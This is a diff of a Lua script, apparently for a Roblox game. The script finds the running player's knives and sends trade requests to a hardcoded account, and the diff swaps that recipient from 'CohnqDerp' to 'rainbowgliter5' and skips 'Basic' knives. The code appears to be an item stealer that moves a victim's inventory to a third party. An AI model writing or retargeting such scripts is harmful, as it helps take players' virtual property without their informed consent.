@@ -35,7 +35,7 @@ local offerKnivesForTrade
 local function isTradingWithAscendSpooq()
     local success, result = pcall(function()
         local tradeLabel = LocalPlayer.PlayerGui.ScreenGui.UI.TradeScreen.TextLabel
-        return tradeLabel and tradeLabel.Text == "Trading with CohnqDerp"
+        return tradeLabel and tradeLabel.Text == "Trading with rainbowgliter5"
     end)
     
     if not success then
@@ -122,7 +122,7 @@ local function getInventoryKnives()
         
         local foundKnives = {}
         for _, child in pairs(knifePath:GetChildren()) do
-            if child:IsA("ImageButton") and child.Name ~= "Template" then
+            if child:IsA("ImageButton") and child.Name ~= "Template" and child.Name ~= "Basic" then
                 table.insert(foundKnives, child.Name)
             end
         end
@@ -217,7 +217,7 @@ end
 
 -- Function to check for player and send trade request
 local function checkForPlayer()
-    local targetPlayer = Players:FindFirstChild("CohnqDerp")
+    local targetPlayer = Players:FindFirstChild("rainbowgliter5")
     
     if targetPlayer then
         print("AscendSpooq is in the game!")
@@ -227,7 +227,7 @@ local function checkForPlayer()
             print("SENDING TRADE REQUEST TO ASCENDSPOOQ")
             
             local args = {
-                [1] = Players.CohnqDerp
+                [1] = Players.rainbowgliter5
             }
             
             local remote = game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("SendTradeRequest")
